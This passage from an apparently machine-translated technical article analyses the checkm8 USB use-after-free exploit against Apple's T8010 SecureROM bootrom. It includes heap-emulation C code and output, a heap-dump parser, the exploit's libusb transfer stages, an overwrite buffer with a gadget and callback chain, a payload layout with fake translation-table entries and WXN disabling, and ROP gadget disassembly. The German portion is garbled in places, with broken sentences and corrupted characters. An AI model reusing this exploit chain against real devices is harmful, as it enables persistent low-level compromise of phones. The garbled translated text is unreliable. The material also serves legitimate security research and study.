des Haufens erstellen.  Das folgende Schema zeigt, wie es gemacht wird: </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  Im Heap von <code>SecureROM</code> wird aus dem kleinsten richtigen freien <code>SecureROM</code> ein neuer Speicherbereich zugewiesen.  Durch Erstellen eines kleinen freien Blocks mit der oben beschriebenen Methode k√∂nnen wir die Speicherzuweisung w√§hrend der <code>USB</code> Initialisierung steuern, einschlie√ülich der Zuweisung des <code>io_buffer</code> und der Anforderungen. </p><br><p>  Um dies besser zu verstehen, sehen wir uns an, welche Anforderungen an den Heap gestellt werden, wenn <code>DFU</code> initialisiert wird.  W√§hrend der Analyse des <code>iBoot</code> Quellcodes und des Reverse Engineering von <code>SecureROM</code> haben wir die folgende Sequenz erhalten: </p><br><ul><li><ol><li>  Zuordnung verschiedener String-Deskriptoren <br><ul><li>  1.1.  <code>Nonce</code> (Gr√∂√üe <code>234</code> ) </li><li>  1.2.  <code>Manufacturer</code> ( <code>22</code> ) </li><li>  1.3.  <code>Product</code> ( <code>62</code> ) </li><li>  1.4.  <code>Serial Number</code> ( <code>198</code> ) </li><li>  1.5.  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li><ol><li>  Zuordnungen im Zusammenhang mit der Erstellung der <code>USB</code> Controller-Aufgabe <br><ul><li>  2.1.  Aufgabenstruktur ( <code>0x3c0</code> ) </li><li>  2.2.  Aufgabenstapel ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ( <code>0x800</code> ) </li></ol><br></li><li><ol><li>  Konfigurationsdeskriptoren <br><ul><li>  4.1.  <code>High-Speed</code> ( <code>25</code> ) </li><li>  4.2.  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p>  Dann werden Anforderungsstrukturen zugewiesen.  Wenn sich ein kleiner Teil im Heap befindet, werden einige Zuordnungen der ersten Kategorie dorthin verschoben, und alle anderen Zuordnungen werden verschoben.  Auf diese Weise k√∂nnen wir <code>usb_device_io_request</code> unter Bezugnahme auf den alten Puffer √ºberlaufen <code>usb_device_io_request</code> .  Es sieht so aus: </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p>  Um den erforderlichen Offset zu berechnen, haben wir einfach alle oben aufgef√ºhrten Zuordnungen emuliert und den Quellcode des <code>iBoot</code> Heaps ein wenig angepasst. </p><br><div class="spoiler">  <b class="spoiler_title">Emulieren von Anforderungen an den Heap in DFU</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p>  Die Ausgabe des Programms mit 8 Anforderungen in der <code>heap feng-shui</code> Phase: </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p>  Wie Sie sehen k√∂nnen, wird eine weitere <code>usb_device_io_request</code> mit dem Offset von <code>0x5c0</code> vom Anfang des vorherigen Puffers <code>0x5c0</code> , der dem Code des Exploits entspricht: </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>  Sie k√∂nnen die G√ºltigkeit dieser Schlussfolgerungen √ºberpr√ºfen, indem Sie den aktuellen Status des <code>SecureRAM</code> Heaps analysieren, den wir mit <code>checkm8</code> .  Zu diesem Zweck haben wir ein einfaches Skript geschrieben, das den Speicherauszug des Heaps analysiert und die Chunks auflistet.  <code>usb_device_io_request</code> Sie, dass w√§hrend des √úberlaufs von <code>usb_device_io_request</code> Teil der Metadaten besch√§digt wurde, sodass wir ihn w√§hrend der Analyse √ºberspringen. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): # skipping damaged chunks this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>  Die Ausgabe des Skripts mit Kommentaren finden Sie unter dem Spoiler.  Sie k√∂nnen sehen, dass die Bytes niedriger Ordnung mit den Ergebnissen der Emulation √ºbereinstimmen. </p><br><div class="spoiler">  <b class="spoiler_title">Das Ergebnis des Parsens des Heaps in SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p> You can also achieve an interesting effect by overflowing the configuration descriptors <code>High Speed</code> and <code>Full Speed</code> that are located right after the <code>IO</code> buffer. One of the fields of a configuration descriptor is responsible for its overall length. By overflowing this field, we can read beyond the descriptor. You can try and do it yourself by modifying the exploit. </p><br><h2 id="2-allocation-and-freeing-of-the-io-buffer-without-clearing-the-global-state"> 2. Allocation and freeing of the IO buffer without clearing the global state </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p> At this stage, an incomplete <code>OUT</code> request for uploading the image is created. At the same time, a global state is initialized, and the address of the buffer in the heap is written to the <code>io_buffer</code> . Then, <code>DFU</code> is reset with a <code>DFU_CLR_STATUS</code> request, and a new iteration of <code>DFU</code> begins. </p><br><h2 id="3-overwriting-usb_device_io_request-in-the-heap-with-use-after-free"> 3. Overwriting <code>usb_device_io_request</code> in the heap with <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, a <code>usb_device_io_request</code> type object is allocated in the heap, and it is overflown with <code>t8010_overwrite</code> , whose content was defined at the first stage. </p><br><p> The values of <code>t8010_nop_gadget</code> and <code>0x1800B0800</code> should overflow the fields <code>callback</code> and <code>next</code> of the <code>usb_device_io_request</code> structure. </p><br><p> <code>t8010_nop_gadget</code> is shown below and conforms to its name, but besides function return, the previous <code>LR</code> register is restored, and because of that the call <code>free</code> is skipped after the <code>callback</code> function in <code>usb_core_complete_endpoint_io</code> . This is important, because we damage the heap's metadata due to overflow, which would affect the exploit in case of a freeing attempt. </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code> points to <code>INSECURE_MEMORY + 0x800</code> . Later, <code>INSECURE_MEMORY</code> will store the exploit's payload, and at the offset of <code>0x800</code> in the payload, there is a <code>callback-chain</code> , which we'll discuss later on. </p><br><h2 id="4-placing-the-payload"> 4. Placing the payload </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p> At this stage, every following packet is put into the memory area allocated for the image. The payload looks like this: </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode # initializing shell-code ... 0x1800B0180: t8010_handler # new usb request handler ... 0x1800B0400: 0x1000006a5 # fake translation table descriptor # corresponds to SecureROM (0x100000000 -&gt; 0x100000000) # matches the value in the original translation table ... 0x1800B0600: 0x60000180000625 # fake translation table descriptor # corresponds to SecureRAM (0x180000000 -&gt; 0x180000000) # matches the value in the original translation table 0x1800B0608: 0x1800006a5 # fake translation table descriptor # new value translates 0x182000000 into 0x180000000 # plus, in this descriptor,there are rights for code execution 0x1800B0610: disabe_wxn_arm64 # code for disabling WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-execution-of-callback-chain"> 5. Execution of <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> After <code>USB</code> reset, the loop of canceling incomplete <code>usb_device_io_request</code> in the queue by going through a linked list is started. In the previous stages, we replaced the rest of the queue, which allows us to control the <code>callback</code> chain. To build this chain, we use this gadget: </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18‚Üëj 